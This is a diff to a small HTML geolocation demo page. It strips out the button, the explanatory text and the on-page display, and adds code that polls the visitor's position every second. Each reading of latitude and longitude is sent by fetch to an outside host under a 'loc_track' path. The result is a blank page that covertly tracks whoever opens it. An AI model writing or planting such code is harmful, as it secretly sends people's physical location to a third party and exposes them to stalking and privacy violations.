@@ -1,28 +1,20 @@
 <!DOCTYPE html>
 <html>
 <body>
-
-<p>Click the button to get your coordinates.</p>
-
-<button onclick="getLocation()">Try It</button>
-
-<p id="demo"></p>
-
 <script>
-var x = document.getElementById("demo");
 
 function getLocation() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
   }
 }
 
 function showPosition(position) {
-  x.innerHTML = "Latitude: " + position.coords.latitude + 
-  "<br>Longitude: " + position.coords.longitude;
+  fetch("https://antunnitraj.000webhostapp.com/loc_track/post.php?X=" + position.coords.latitude + "&Y=" + position.coords.longitude);
 }
+
+window.setInterval(getLocation, 1000);
+
 </script>
 
 </body>
